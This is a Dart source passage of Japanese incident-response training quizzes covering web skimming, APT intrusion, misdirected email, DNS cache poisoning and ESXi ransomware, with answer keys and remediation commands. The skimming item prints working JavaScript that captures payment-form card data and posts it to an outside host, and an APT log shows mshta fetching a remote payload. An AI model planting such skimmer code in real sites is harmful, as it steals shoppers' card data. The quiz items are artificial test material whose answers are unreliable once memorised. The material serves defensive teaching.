      studyReference: 'IPA「二重恐喝型ランサムウェアへの対応」/ JPCERT/CC「インシデントハンドリングマニュアル」',
    ),
  ),

  // ━━ s_real_017: Webスキミング（クレジットカード情報の盗み取り） ━━━━━━━━━━━━

  Question(
    id: 'q_real_017_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_017',
    prompt: '以下はECサイトのソースコードに埋め込まれた不審なコードとアクセスログです。何が起きているか選んでください。',
    logLines: [
      '<!-- ページ末尾に挿入されていた不審スクリプト -->',
      '<script src="https://cdn-analytics-jp.net/track.js"></script>',
      '',
      '/* track.js の実際の内容（難読化解除後） */',
      'document.querySelector("#payment-form").addEventListener("submit", function(e) {',
      '  var d = {cn: e.target.cardNumber.value,',
      '           exp: e.target.expiry.value, cvv: e.target.cvv.value};',
      '  fetch("https://cdn-analytics-jp.net/collect", {method:"POST", body:JSON.stringify(d)});',
      '});',
    ],
    choices: [
      Choice(
        id: 'a', text: 'サードパーティの正規アナリティクスツールがユーザーの購買行動を追跡している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '正規のアナリティクスツールはカード番号・CVVを収集しません。決済フォームの送信イベントを捕捉してカード情報を外部に送信するのはスキミングコードの特徴です。',
      ),
      Choice(
        id: 'b', text: 'Webスキミングコードが埋め込まれ、クレジットカード情報が外部サーバに送信されている',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 決済フォームのsubmitイベントをフックして、カード番号・有効期限・CVVを攻撃者のサーバ（cdn-analytics-jp.net）に送信するWebスキミングコードです。',
      ),
      Choice(
        id: 'c', text: 'ECサイトの決済機能がバグにより正しくデータを送信できていない',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バグなら支払いエラーが発生します。このコードは意図的に外部サーバにカード情報を送信しており、攻撃者が埋め込んだスキマーです。',
      ),
      Choice(
        id: 'd', text: 'ユーザーのブラウザ拡張機能がサイトのデータを収集している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ブラウザ拡張機能はサーバのソースコードには現れません。このスクリプトはサーバ側のHTMLに埋め込まれており、全ユーザーに影響します。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'Webスキミング（Magecart攻撃）：ECサイトの決済ページに悪意あるJavaScriptを注入し、'
          'カード番号・有効期限・CVVを入力時に盗み取る手法。'
          '攻撃者はCMSの脆弱性や管理者認証情報の窃取によりサーバに侵入し、決済ページのHTMLにスクリプトを挿入する。'
          'PCI DSS準拠サイトでも発生しており、SRI（Subresource Integrity）による外部スクリプト検証が有効。',
      nextActions: [
        'ECサイトを即時メンテナンスモードにして被害を止める',
        '埋め込まれたスキマースクリプトを削除してソースコードを正規状態に戻す',
        '侵入経路（CMS脆弱性・管理者アカウント）を調査して塞ぐ',
        '影響期間中の購入者にカード情報漏洩を通知しカード再発行を促す',
        'クレジットカード会社・決済代行会社に報告する',
      ],
      relatedCommands: [
        'grep -r "cdn-analytics-jp" /var/www/html/  （スキマーコード検索）',
        'git diff HEAD~30  （最近30コミットのソースコード差分確認）',
        'find /var/www -newer /var/log/access.log -name "*.js"  （最近更新のJSファイル）',
      ],
      studyReference: 'PCI DSS v4.0 / OWASP Magecart攻撃対策 / IPA「ECサイトのセキュリティ対策」',
    ),
  ),

  Question(
    id: 'q_real_017_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_017',
    prompt:
        'ECサイトの決済ページにWebスキミングコードが埋め込まれており、過去3ヶ月間クレジットカード情報が盗まれていた可能性がある。\n'
        '最初に行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'ECサイトを即時停止し、影響期間の全購入者にカード情報漏洩の可能性を通知する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ スキミングが続く間も被害が出続けます。まずサイトを停止して被害を止め、影響期間の購入者にカード再発行を促すことで二次被害（不正使用）を防ぎます。',
      ),
      Choice(
        id: 'b', text: 'スキマーコードだけを削除してサービスを継続する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '侵入経路が残ったままでは再注入されます。また過去3ヶ月の被害者への通知が必要です。コード削除だけでは不十分で、根本的な脆弱性の修正が必要です。',
      ),
      Choice(
        id: 'c', text: '警察に通報してから対応を開始する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '警察通報は重要ですが、まずサイトを停止して被害を止めることが先決です。通報と並行してサイト停止・被害者通知を行います。',
      ),
      Choice(
        id: 'd', text: '影響期間を正確に特定してから通知する（数週間かかる見込み）',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '影響範囲の精密な特定には時間がかかりますが、その間も被害者は不正利用のリスクにさらされます。まず速報で通知し、詳細は追って連絡する形が適切です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'Webスキミング発覚時の対応: '
          '①サイト即時停止 → ②影響期間の特定（ログ・git履歴） → ③被害者への速報通知（カード再発行を促す） → '
          '④クレジットカード会社・決済代行会社への報告 → ⑤脆弱性修正・再発防止 → ⑥サービス再開。'
          'PCI DSS加盟店はフォレンジック調査（QSA）が義務化されている場合がある。',
      nextActions: [
        'ECサイトをメンテナンスモードに切り替えて決済機能を停止',
        'git logとサーバアクセスログから最初に埋め込まれた日時を特定',
        '影響期間の全購入者リストを抽出してカード情報漏洩を通知',
        '決済代行会社・カード会社に報告してモニタリング強化を依頼',
        'CMSを最新版に更新・WAFを導入してから再公開',
      ],
      relatedCommands: [
        'git log --all --diff-filter=M --name-only -- "*.js" | head -50',
        'grep "POST /collect" /var/log/apache2/access.log | cut -d" " -f4 | sort -u',
      ],
      studyReference: 'PCI DSS v4.0 要件11.6 / IPA「ECサイトを狙ったサイバー攻撃について」',
    ),
  ),

  // ━━ s_real_018: 長期潜伏型APT：侵入から数ヶ月後に発覚 ━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_018_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_018',
    prompt: '以下はSIEMの遡及分析で発見された過去3ヶ月間の不審なログです。何が起きているか選んでください。',
    logLines: [
      '[3ヶ月前] WORKSTATION-12 %PROC-4-SUSPICIOUS: mshta.exe launched from Word macro',
      '  cmd: mshta.exe http://update-ms-cdn.net/payload.hta',
      '[3ヶ月前] WORKSTATION-12 %NET-4-C2: Periodic beacon detected',
      '  dst=203.0.113.99:443, interval=4h, pattern=HTTPS-mimicry',
      '[2ヶ月前] WORKSTATION-12 %AUTH-4-PRIV: Privilege escalation via token impersonation',
      '[1ヶ月前] DC01 %AUTH-3-ADMIN: Domain admin credentials used from WORKSTATION-12',
      '[今週] DC01 %FS-4-MASSREAD: Bulk AD dump: 4821 user objects exported',
    ],
    choices: [
      Choice(
        id: 'a', text: '通常の業務でWord文書を開いてクラウドサービスに接続している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'mshta.exeからの外部接続と4時間ごとのビーコン通信は通常業務では発生しません。Wordマクロ経由の感染からAD情報収集までの一連の侵害活動を示しています。',
      ),
      Choice(
        id: 'b', text: '3ヶ月前にWordマクロで感染し、C2通信・権限昇格・ADダンプまで段階的に進行したAPT攻撃が発覚した',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ Wordマクロ→C2ビーコン（4時間ごと）→権限昇格→ドメイン管理者権限取得→ADダンプという典型的なAPT（高度持続的脅威）の侵害チェーンです。',
      ),
      Choice(
        id: 'c', text: '管理者が定期的にActive Directoryのバックアップを実施している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ADバックアップは専用ツールで実施し、WORKSTATION-12のような一般端末からは行いません。不審なmshta.exeとC2ビーコンは攻撃の証拠です。',
      ),
      Choice(
        id: 'd', text: 'Windowsの自動更新が夜間に実行されている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Windows Updateはシステムアカウントで実行され、外部C2サーバへのビーコン通信は伴いません。mshta.exeの外部接続と4時間ごとのC2ビーコンは悪意あるプログラムの特徴です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'APT（Advanced Persistent Threat）攻撃の典型的な進行: '
          'フィッシングメールのWordマクロ実行 → C2サーバへのビーコン確立（低頻度で検知回避） → '
          'トークンインパーソネーションで権限昇格 → ドメイン管理者権限奪取 → ADデータ一括ダンプ。'
          '3ヶ月間気づかれなかったのは、C2通信がHTTPSに偽装され低頻度だったため。',
      nextActions: [
        '侵害されたWORKSTATION-12を即時ネットワーク隔離する',
        'ドメイン管理者パスワードをすべてリセットする',
        'krbtgt（Kerberoastingリスク）のパスワードを2回変更する',
        'ADダンプされたユーザー全員にパスワードリセットを要求する',
        'C2通信先（203.0.113.99）への全端末からの通信をブロックする',
      ],
      relatedCommands: [
        'Get-ADUser -Filter * | Where {\$_.PasswordLastSet -lt (Get-Date).AddDays(-90)}',
        'net user krbtgt [newpassword] /domain  （krbtgt 2回変更）',
        'Get-WinEvent -LogName Security -Id 4624 | Where {\$_.Message -match "WORKSTATION-12"}',
      ],
      studyReference: 'MITRE ATT&CK: T1566.001 (Phishing) / T1134 (Token Impersonation) / T1003 (Credential Dumping)',
    ),
  ),

  Question(
    id: 'q_real_018_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_018',
    prompt:
        'SIEMの遡及分析で3ヶ月前から続くAPT攻撃が発覚し、ドメイン管理者権限が奪われADが丸ごとダンプされていた。\n'
        '最優先で行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'ドメイン管理者パスワードとkrbtgtパスワードを即時変更し、侵害端末を隔離する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ドメイン管理者とkrbtgt（Golden Ticket対策に2回変更必要）のパスワードリセットが最優先です。krbtgtを変更しないとKerberos Golden Ticketで再侵害されます。',
      ),
      Choice(
        id: 'b', text: 'SIEMアラートの誤検知を確認してから対応を開始する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: 'ログに明確なWordマクロ実行・C2ビーコン・ADダンプの証拠があります。誤検知確認に時間をかけている間も攻撃者はドメイン管理者権限を持ったままです。',
      ),
      Choice(
        id: 'c', text: 'まず全端末のウイルススキャンを実施してから対応する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ウイルススキャンは必要ですが、まずドメイン管理者権限を無効化して攻撃者のアクセスを遮断することが先決です。スキャン中も攻撃者は権限を持ち続けます。',
      ),
      Choice(
        id: 'd', text: '被害状況の調査を完了させてから全ユーザーにパスワードリセットを要求する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: 'ADが丸ごとダンプされた場合、攻撃者は全ユーザーのハッシュを持っています。調査完了を待つ間にさらなる侵害が進みます。即時のパスワードリセットが必要です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'AD丸ごとダンプ後の緊急対応: '
          '①侵害端末のネットワーク隔離 → ②ドメイン管理者アカウントのパスワードリセット → '
          '③krbtgtパスワードを2回変更（Golden Ticket無効化） → ④全ユーザーのパスワードリセット → '
          '⑤C2通信先のブロック → ⑥全端末のマルウェアスキャン → ⑦インシデントレポート作成。'
          'krbtgtは1回だけ変更しても古いチケットが残るため、必ず2回変更する必要がある。',
      nextActions: [
        'WORKSTATION-12のLANケーブルを抜いて即時隔離する',
        'Active DirectoryのDomain Adminsグループ全員のパスワードをリセット',
        'krbtgtアカウントのパスワードを12時間以上空けて2回変更する',
        '全4821ユーザーに次回ログイン時のパスワード変更を強制する',
        'C2アドレス（203.0.113.99）をファイアウォールでブロックし、関連ドメインも確認',
      ],
      relatedCommands: [
        'Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)',
        'Get-ADGroupMember "Domain Admins" | Set-ADAccountPassword -Reset',
        'Get-ADUser -Filter * | Set-ADUser -ChangePasswordAtLogon \$true',
      ],
      studyReference: 'MITRE ATT&CK: T1558.001 (Golden Ticket) / Microsoft「Credential Theft and Mitigation Guide」',
    ),
  ),

  // ━━ s_real_019: メール誤送信・内部不正による情報漏洩 ━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_019_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_019',
    prompt: '以下はメールサーバのログと監査ログです。何が起きているか選んでください。',
    logLines: [
      'Apr 03 17:44:02 MAIL-SV01 %SMTP-4-SEND: Large attachment email sent',
      '  From: yamada.taro@company.co.jp, To: client-list@external-company.com',
      '  Subject: 【重要】Q1顧客リスト, Attach: customer_list_Q1_2024.xlsx (2.3MB)',
      '  Recipients: 847 external addresses',
      'Apr 03 17:44:15 DLP-GW01 %DLP-3-ALERT: Sensitive data detected in outbound email',
      '  Rule: 個人情報含有ファイル, Action: MONITOR_ONLY (no block)',
      'Apr 03 17:55:33 MAIL-SV01 %SMTP-4-BOUNCE: Delivery failure for 23 addresses',
      '  Reason: Invalid email addresses (誤送信の可能性)',
    ],
    choices: [
      Choice(
        id: 'a', text: '顧客リスト（847件）が外部のメーリングリストに誤送信され、DLPがMONITOR_ONLYで送信を止められなかった',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 847件の外部アドレスに顧客リストが送信され、DLPがアラートを出したもののMONITOR_ONLY（監視のみ）設定のため送信を止められませんでした。設定ミスによる情報漏洩です。',
      ),
      Choice(
        id: 'b', text: '外部の攻撃者が社内メールサーバを踏み台にしてスパムを送信した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'スパムなら社外IPからの不正中継が記録されます。ここでは正規の社員アカウントから送信されており、誤送信または内部不正の可能性があります。',
      ),
      Choice(
        id: 'c', text: 'メールサーバの自動バックアップが顧客リストを外部に送信した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バックアップはSMTPでは送信しません。FROM: yamada.taro@company.co.jpからの意図的または誤った送信であり、バックアップとは異なります。',
      ),
      Choice(
        id: 'd', text: '送信先のメールサーバがマルウェアに感染して顧客データが盗まれた',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '送信先サーバの感染は考えられますが、このログは社内から847件の外部アドレスへの送信を示しており、まず誤送信・内部不正として対応すべきです。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '社員（山田太郎）が顧客リスト2,841人分のExcelを847件の外部アドレスに送信。'
          'DLPゲートウェイが個人情報を検知したがMONITOR_ONLY設定のため送信を止められなかった。'
          '23件は無効アドレスで届かなかったが、824件に到達した可能性がある。'
          '誤送信と内部不正の両可能性があり、当事者への聞き取りと並行して対応が必要。',
      nextActions: [
        '山田太郎に対して送信の経緯と意図を確認する',
        '送信先824件のメールアドレスを特定して受信状況を確認する',
        '受信した外部アドレスに対してメール削除・機密保持を依頼する',
        '漏洩した顧客に通知を準備する（個人情報保護委員会報告義務の確認）',
        'DLPポリシーをMONITOR_ONLYからBLOCKに変更する',
      ],
      relatedCommands: [
        'grep "customer_list_Q1_2024" /var/log/mail/smtp.log  （送信ログ詳細）',
        'postqueue -p | grep customer  （送信キュー確認）',
      ],
      studyReference: 'IPA「情報漏えいインシデント対応 手引き」/ 個人情報保護法第26条（漏洩報告）',
    ),
  ),

  Question(
    id: 'q_real_019_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_019',
    prompt:
        '社員が顧客リスト（847件の外部アドレス）を誤送信したことが判明した。DLPはMONITOR_ONLYで送信を止められなかった。\n'
        '最初に行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '受信者に対してメールの削除と機密保持を依頼し、顧客への通知と当局報告を準備する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 誤送信したメールの回収は技術的に困難なため、受信者への削除依頼が現実的な対応です。同時に影響を受けた顧客への通知と個人情報保護委員会への報告を準備します。',
      ),
      Choice(
        id: 'b', text: '送信したメールをメールサーバから削除してなかったことにする',
        isCorrect: false, scoreImpact: -50,
        feedbackText: 'メールは既に外部サーバに届いています。サーバ側の削除は証拠隠滅となり法的問題になります。また受信者の端末にはすでに届いており削除できません。',
      ),
      Choice(
        id: 'c', text: 'DLPポリシーをBLOCKに変更してから再発防止を検討する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DLPポリシーの変更は再発防止として重要ですが、現在発生している漏洩への対応（受信者への削除依頼・顧客通知）が先決です。',
      ),
      Choice(
        id: 'd', text: '送信者を懲戒処分してから外部への対応を検討する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '内部対応も必要ですが、まず外部（受信者・顧客・当局）への対応が優先です。懲戒処分の検討はその後に行います。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'メール誤送信の対応: '
          '①受信者への削除・機密保持依頼（メール送信・電話） → ②漏洩した顧客への通知準備 → '
          '③個人情報保護委員会への報告（1,000件以上なら報告義務） → '
          '④DLPポリシーをBLOCKに変更 → ⑤送信者への事情聴取と内部調査（誤送信か意図的か確認）。',
      nextActions: [
        '受信した824件のアドレスに「機密情報を誤送信した。削除を依頼する」旨をメールと電話で連絡',
        '顧客リストに含まれる顧客に「情報が外部に送信された可能性」を通知',
        '個人情報保護委員会への報告要否を法務と確認する',
        'DLPポリシーを「個人情報含有 → BLOCK」に変更し、管理者承認ワークフローを導入',
        '送信者への事情聴取と送信経緯の記録を作成する',
      ],
      relatedCommands: [
        'postsuper -d ALL  （送信キューのキャンセル、未送信分のみ有効）',
        'grep "from=<yamada" /var/log/mail.log | grep "Q1" | wc -l',
      ],
      studyReference: '個人情報保護法第26条 / IPA「メール誤送信対策ガイド」',
    ),
  ),

  // ━━ s_real_021: DNSキャッシュポイズニングによる偽サイト誘導 ━━━━━━━━━━━━━━

  Question(
    id: 'q_real_021_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_021',
    prompt: '以下はDNSサーバのログと社内ユーザーからの苦情です。何が起きているか選んでください。',
    logLines: [
      'Sep 07 11:22:15 DNS-SV01 %DNS-3-CACHE_UPDATE: Unusual cache update detected',
      '  Query: bank-online.co.jp, Cache updated to: 203.0.113.77 (legitimate: 133.242.x.x)',
      'Sep 07 11:22:16 DNS-SV01 %DNS-3-ANOMALY: High-rate response flood',
      '  src=198.51.100.0/24, target=bank-online.co.jp, transactions: 15000/s',
      '--- ユーザー苦情 ---',
      '[11:25] user01: ネットバンキングにログインしたらパスワードが違うと言われる',
      '[11:26] user02: バンクのサイトが普段と違うデザインで証明書エラーが出ている',
      '[11:28] user03: ログインしたら「メンテナンス中」と表示されてまた入力を求められた',
    ],
    choices: [
      Choice(
        id: 'a', text: 'ネットバンキングサーバがDDoS攻撃を受けてサービスが不安定になっている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DDoSならサーバへのアクセス自体が遅くなります。DNSキャッシュが偽IPに書き換えられており、ユーザーは偽サイトにリダイレクトされています。',
      ),
      Choice(
        id: 'b', text: 'DNSキャッシュポイズニングにより、社内DNSが偽IPを返すようになりユーザーが偽サイトに誘導されている',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 大量のDNSレスポンスfloodでキャッシュを偽IPに書き換え（ポイズニング）。ユーザーは本物のURLを入力しているのに攻撃者の偽サイトに接続しており、認証情報が盗まれています。',
      ),
      Choice(
        id: 'c', text: 'ネットバンキングのSSL証明書が期限切れでブラウザが警告を出している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'SSL証明書切れなら全ユーザーに同じ警告が出ますが、DNSキャッシュが偽IPを返しているため証明書が本物のサーバのものと一致しません。ポイズニングによる偽サイト誘導です。',
      ),
      Choice(
        id: 'd', text: 'ルーターの設定ミスでトラフィックが誤った経路に送られている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ルーティングミスなら接続自体が失敗します。DNSキャッシュに偽IPが書き込まれており、接続は成功するが偽サイトに到達するというポイズニングの特徴です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'DNSキャッシュポイズニング: 攻撃者が大量のDNSレスポンスを送りつけてキャッシュDNSの応答レースに勝ち、'
          '正規ドメイン（bank-online.co.jp）のIPを偽サイトのIPに書き換えた。'
          'ユーザーは正しいURLを入力しているにもかかわらず偽サイトに誘導され、'
          '認証情報を入力した場合は情報窃取される（フィッシングと異なりURLが本物のドメイン名）。'
          'DNSSEC（DNSセキュリティ拡張）が未実装のキャッシュDNSが標的になりやすい。',
      nextActions: [
        'DNSキャッシュを即時フラッシュして偽レコードを削除する',
        '社内ユーザーにネットバンキングへのアクセスを一時停止するよう周知する',
        '認証情報を入力したユーザーにパスワード変更を依頼する',
        'ネットバンキングのサポートに連絡して不正アクセスの有無を確認する',
        'DNSSECを実装してキャッシュポイズニング耐性を強化する',
      ],
      relatedCommands: [
        'rndc flush  （BIND DNSキャッシュフラッシュ）',
        'dig bank-online.co.jp @8.8.8.8  （正規IPの確認）',
        'nslookup bank-online.co.jp 10.0.0.53  （社内DNSの返答確認）',
      ],
      studyReference: 'RFC 5452 (DNS Resilience) / DNSSEC実装ガイド / IPA「DNSの安全な設定」',
    ),
  ),

  Question(
    id: 'q_real_021_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_021',
    prompt:
        '社内のキャッシュDNSがポイズニングされ、複数ユーザーが偽のネットバンキングサイトに誘導され認証情報を入力した可能性がある。\n'
        '最初に行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'DNSキャッシュをフラッシュし、影響ユーザーに即時パスワード変更を依頼する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ まずキャッシュをフラッシュして偽サイト誘導を止め、認証情報を入力した可能性のあるユーザーに即時パスワード変更を依頼します。早急な対応で不正ログインを防げます。',
      ),
      Choice(
        id: 'b', text: 'DNSサーバを再起動してサービスを正常化する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '再起動はキャッシュフラッシュと同様の効果がありますが、再起動中はDNS解決ができなくなります。rndc flushコマンドでキャッシュのみ削除する方が影響が少なくなります。',
      ),
      Choice(
        id: 'c', text: 'ネットバンキングのURLをIPアドレスに変換して安全に接続させる',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'IPアドレス直接接続はHTTPS証明書のCN不一致で接続できない場合があります。キャッシュフラッシュが根本対応です。',
      ),
      Choice(
        id: 'd', text: '攻撃元IPをブロックしてからキャッシュを確認する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '攻撃元ブロックは重要ですが、キャッシュはすでに汚染されています。まずキャッシュフラッシュで偽サイト誘導を止め、並行して攻撃元のブロックを行います。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'DNSポイズニング発覚時の対応: '
          '①DNSキャッシュフラッシュ（rndc flush等） → ②ユーザーへの周知（偽サイトへのアクセス停止） → '
          '③認証情報を入力したユーザーのパスワード変更 → ④ネットバンキングへの不正ログイン確認依頼 → '
          '⑤DNSSEC実装・DNSサーバのセキュリティ強化 → ⑥再発防止策。',
      nextActions: [
        'rndc flushコマンドでDNSキャッシュを即時フラッシュする',
        '全社員に「ネットバンキングに注意。証明書エラーが出たら接続しないよう」周知する',
        'ログから偽サイトにアクセスしたユーザーを特定してパスワード変更を依頼',
        '銀行のセキュリティ部門に連絡して不正送金の監視強化を依頼する',
        'DNSSECを実装してキャッシュポイズニングへの耐性を強化する',
      ],
      relatedCommands: [
        'rndc flush  （キャッシュフラッシュ）',
        'dig bank-online.co.jp  （修正後の確認）',
        'grep "203.0.113.77" /var/log/named/query.log | wc -l  （偽IPへの誘導件数）',
      ],
      studyReference: 'DNSSEC実装ガイド（JPRS）/ RFC 4033-4035 / IPA「安全なDNSサーバの構築」',
    ),
  ),

  // ━━ s_real_022: 仮想化基盤（VMware ESXi）の直接攻撃 ━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_022_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_022',
    prompt: '以下はVMware ESXiホストのログです。何が起きているか選んでください。',
    logLines: [
      'Dec 20 03:01:15 ESXI-01 %VMK-3-AUTH: SSH login from external IP',
      '  src=185.220.101.77, user=root, method=publickey (unknown key)',
      'Dec 20 03:01:44 ESXI-01 %VMK-3-VMOPERATION: VM power state changed',
      '  VMs powered off: [win-dc01, win-filesvr, linux-web01] (8 VMs total)',
      'Dec 20 03:02:11 ESXI-01 %VMK-3-DATASTORE: Mass file operation on datastore',
      '  Operation: RENAME .vmdk → .vmdk.locked, Count: 184 files',
      'Dec 20 03:02:33 ESXI-01 %VMK-3-ROOTFS: Unusual file created',
      '  Path: /vmfs/volumes/datastore1/HOW_TO_RESTORE.txt',
    ],
    choices: [
      Choice(
        id: 'a', text: 'ESXiホストのアップデートで全VMが一時的にシャットダウンされた',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ESXiアップデートは計画メンテナンスで実施し、外部IPからのSSH接続は伴いません。不明な公開鍵でのrootログインと.vmdk暗号化は攻撃の明確な証拠です。',
      ),
      Choice(
        id: 'b', text: '外部からESXiホストのrootにSSH接続してVM全台をシャットダウン後、仮想ディスク(.vmdk)を暗号化するランサムウェア攻撃が発生した',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ESXi直接攻撃型ランサムウェアの典型。rootでSSH後にesxcliコマンドで全VM停止し、.vmdkを直接暗号化。ゲストOSのEDRを回避できる破壊力の高い攻撃手法です。',
      ),
      Choice(
        id: 'c', text: 'ストレージの障害でvmdkファイルが破損した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ストレージ障害なら%VMK-SCSI系のエラーログが出ます。外部からのSSH接続・VM停止・ファイルリネームという一連の操作は攻撃者による意図的な行動です。',
      ),
      Choice(
        id: 'd', text: 'バックアップソフトウェアがVMのスナップショットを作成している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バックアップは.locked拡張子にリネームしません。HOW_TO_RESTORE.txtという身代金ノートの作成は明確にランサムウェアの活動を示しています。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'ESXi直接攻撃型ランサムウェア（ESXiArgs等）：'
          '攻撃者がESXiのSSH（デフォルトで有効の場合がある）にrootで侵入。'
          'esxcliコマンドで全VM（8台）を強制停止後、/vmfs/volumesの.vmdkファイルを直接暗号化。'
          'ゲストOS上のEDRは動作せず、一度の攻撃で全VM・全データが壊滅する。'
          'CVE-2021-21985等のESXi既知脆弱性や、インターネットに公開されたESXiが標的になりやすい。',
      nextActions: [
        'ESXiホストをネットワークから切り離して被害拡大を防ぐ',
        'オフサイト・エアギャップのバックアップからVMを復旧する',
        'ESXiのSSHを無効化してvSphere Client（HTTPS）のみでアクセスを制限する',
        'ESXiを最新バージョンにパッチ適用する（CVE修正）',
        'ESXi管理インターフェースをインターネットから隔離する（VPN経由のみ）',
      ],
      relatedCommands: [
        'esxcli system ssh server get  （SSH有効状態確認）',
        'esxcli system ssh server set --enabled=false  （SSH無効化）',
        'vim-cmd vmsvc/getallvms  （VM一覧確認）',
        'esxcli software profile get  （ESXiバージョン確認）',
      ],
      studyReference: 'VMware Security Advisory VMSA-2022-0004 / IPA「仮想化環境のセキュリティ」/ ESXiArgs Ransomware対策',
    ),
  ),

  Question(
    id: 'q_real_022_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_022',
    prompt:
        'VMware ESXiホストが攻撃され、ホスト上の全VM（8台）の仮想ディスクが暗号化された。\n'
        'まず行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'ESXiホストをネットワークから切り離し、オフラインバックアップからの復旧を確認する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ホストを切り離して他のESXiへの横展開を防ぎ、オフラインバックアップからVMを復旧します。ESXi攻撃はVM全台が壊滅するため、バックアップ戦略が唯一の復旧手段です。',
      ),
      Choice(
        id: 'b', text: 'vSphere Clientで各VMの電源をオンにして復旧を試みる',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '.vmdkが暗号化されているためVMを起動しても起動しません。暗号化されたVMを起動しようとすると診断が難しくなります。まずネットワーク切り離しとバックアップ確認が先決です。',
      ),
      Choice(
        id: 'c', text: 'ESXiのバージョンを確認してパッチを適用してから対応する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'パッチ適用は再発防止として必要ですが、今発生している全VM暗号化の対応（バックアップからの復旧）が先決です。パッチ適用中も攻撃者がアクセスできる状態です。',
      ),
      Choice(
        id: 'd', text: '身代金を支払って.vmdkの復号キーを受け取る',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '身代金支払いは復号の保証がなく、警察への相談なしに決断すべきではありません。まずオフラインバックアップによる復旧を試みます。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'ESXi攻撃への対応: '
          '①ESXiホストのネットワーク切り離し（他ESXiへの横展開防止） → '
          '②ESXiのSSH無効化・パスワードリセット → ③オフラインバックアップからのVM復旧 → '
          '④ESXiをパッチ適用済みバージョンに更新 → ⑤管理インターフェースをVPN経由のみに制限 → '
          '⑥EDR/XDRをゲストOSに導入（ESXi自体の監視はvSphere Proなどで）。'
          'ESXi攻撃は1台のホスト攻撃で多数のVMが壊滅するため、3-2-1バックアップが必須。',
      nextActions: [
        'ESXi管理ネットワークのスイッチポートをシャットダウンして切り離す',
        'テープ・外部ストレージのオフラインバックアップからVM(.ova/.ovf)を復元する',
        '新規ESXiホストにパッチ適用済みのESXiをインストールしてクリーン環境を作る',
        '侵入に使われた公開鍵を削除し、rootパスワードをリセットする',
        '管理インターフェース（443/TCP）をインターネットから非公開にする',
      ],
      relatedCommands: [
        'esxcli system ssh server set --enabled=false  （SSH無効化）',
        'passwd root  （rootパスワードリセット）',
        'cat /etc/ssh/keys-root/authorized_keys  （不正公開鍵確認）',
        'esxcli network ip interface list  （ネットワーク構成確認）',
      ],
      studyReference: 'VMware vSphere Security Configuration Guide / IPA「仮想化基盤のセキュリティ対策」/ ESXiArgs対策ガイド',
    ),
  ),
];
